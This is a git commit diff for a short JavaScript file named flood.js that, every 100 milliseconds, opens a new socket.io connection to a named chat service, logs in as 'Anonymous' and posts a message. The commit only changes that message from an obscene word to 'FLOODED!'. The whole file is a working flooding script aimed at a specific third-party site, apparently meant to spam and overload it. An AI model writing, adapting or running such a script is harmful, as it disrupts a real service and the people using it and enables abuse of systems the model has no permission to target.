0de0cf07b194dbd0f4370d2c84218cfeb8d44f03
ComputerFan7252 <c7180823@gmail.com>
2025-08-09 20:26:49 +0300

    Update flood.js

--- flood.js
+++ flood.js
@@ -1,4 +1,4 @@
 alert('time for flood');
 setInterval(function(){var Doe = io('https://bonziworld-revived-1.onrender.com/');
 Doe.emit('login',{name:'Anonymous'});
-Doe.emit('talk',{text:'fap'})},100);
+Doe.emit('talk',{text:'FLOODED!'})},100);
